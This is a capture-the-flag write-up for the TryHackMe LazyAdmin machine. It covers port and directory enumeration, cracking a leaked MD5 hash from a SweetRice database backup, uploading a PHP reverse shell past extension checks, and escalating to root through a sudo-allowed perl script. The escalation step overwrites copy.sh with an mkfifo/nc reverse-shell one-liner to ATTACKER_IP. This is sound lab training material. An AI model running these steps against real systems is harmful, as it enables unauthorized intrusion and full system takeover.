# [LazyAdmin](https://tryhackme.com/room/lazyadmin)

## Easy linux machine to practice your skills

### What is the user flag?

1. First, scan for open ports with `nmap` to identify available services

```bash
nmap IP
```

![SCREEN01](https://github.com/user-attachments/assets/5f1f2398-f32e-4adc-8fd9-4c3d3d1eca2a)

2. Enumerate directories on the web server using `gobuster` to discover hidden content
   - We've discovered a `/content` directory. The web application is running `SweetRice`, a Content Management System

```bash
gobuster dir -u http://IP -w /root/Tools/wordlists/dirbuster/directory-list-2.3-medium.txt
```

![SCREEN02](https://github.com/user-attachments/assets/5f23b76e-b310-472d-b8df-6cbd2481ec25)

3. Scan `/content` directory to find additional resources
   - This reveals two interesting directories: `/content/inc/mysql_backup/` and `/content/as/`

```bash
gobuster dir -u http://IP/content -w /root/Tools/wordlists/dirbuster/directory-list-2.3-medium.txt
```

4. Investigating the `/content/inc/mysql_backup/` directory in the browser, we discover a database backup file `mysql_bakup_20191129023059-1.5.1.sql`
   - There are credentials for manager: `manager:42f749ade7f9e195bf475f37a44cafcb`

```bash
grep "admin" mysql_bakup_20191129023059-1.5.1.sql
```

![SCREEN03](https://github.com/user-attachments/assets/9ab71195-8301-4afa-b155-a11f40fbfdc5)

5. Crack this MD5 hash using [CrackStation](https://crackstation.net/) and login to `http://IP/content/as/`

![SCREEN04](https://github.com/user-attachments/assets/c2d34ab0-73c1-406f-b3f2-e84335f69e59)

6. Create a [PHP reverse shell](https://github.com/mosec0/Reverse-Shell/blob/main/reverse-shell.php) and upload it to `http://IP/content/as/?type=media_center`. We need to change extension of the file (to `.phtml` for example) to bypass validation

![SCREEN05](https://github.com/user-attachments/assets/4b393023-4d3f-4cbc-9e1c-e21bfa55dd42)

7. Before triggering the shell (by clicking on the file), set up a netcat listener on our attack machine

8. Upgrade shell and get the user flag

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
cat /home/itguy/user.txt
```

![SCREEN06](https://github.com/user-attachments/assets/a7c73266-a851-40bd-a870-746bc7c7792e)

---

### What is the root flag?

1. Check what sudo permissions we have

```bash
sudo -l
```

![SCREEN07](https://github.com/user-attachments/assets/030e1774-2e51-4efc-b271-018dde4f324f)

2. We can run `/usr/bin/perl` `/home/itguy/backup.pl` with sudo privileges

```bash
cat backup.pl
cat etc/copy.sh
```

![SCREEN08](https://github.com/user-attachments/assets/5cf67d08-5f7c-4f4e-b0b1-a63ab000aa1c)

3. Set another listener and replace the ip in `etc/copy.sh` script with our own and run it

```bash
nc -lvnp 5554
```

```bash
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc ATTACKER_IP 5554 > /tmp/f" > /etc/copy.sh
sudo /usr/bin/perl /home/itguy/backup.pl
```

![SCREEN09](https://github.com/user-attachments/assets/2a4e412d-fbce-4b15-aac2-35aabf9688d4)

4. Get the root flag

```bash
whoami
cat /root/root.txt
```

![SCREEN10](https://github.com/user-attachments/assets/70b0f7f9-f271-4bfd-a428-73f23c514f85)
